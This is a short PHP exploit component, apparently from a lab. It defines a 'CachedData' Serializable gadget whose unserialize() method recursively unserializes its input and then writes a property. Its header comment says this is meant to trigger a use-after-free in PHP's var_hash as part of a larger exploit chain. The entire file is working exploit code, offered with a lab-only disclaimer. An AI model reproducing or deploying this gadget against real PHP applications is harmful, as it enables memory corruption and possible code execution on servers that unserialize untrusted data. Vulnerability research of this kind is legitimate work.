<?php
/* Shared var_hash UAF gadget for the brleak binbase-recalibration lab.
 *
 * The iQingshan CachedData Serializable gadget the a7 chain needs:
 * CachedData::unserialize() recursively calls unserialize() then does one extra
 * property write (->x = 0), the 9th insert that resizes the inner stdClass
 * arData and frees the buffer the OUTER var_hash still indexes -> the
 * CVE-2026-109618/109619 var_hash use-after-free.
 *
 * Lab/analysis use only, on systems you own.
 */

error_reporting(E_ALL & ~E_DEPRECATED);
ini_set('display_errors', '0');

class CachedData implements Serializable
{
    public function serialize(): string
    {
        return '';
    }

    public function unserialize(string $data): void
    {
        unserialize($data)->x = 0;
    }
}
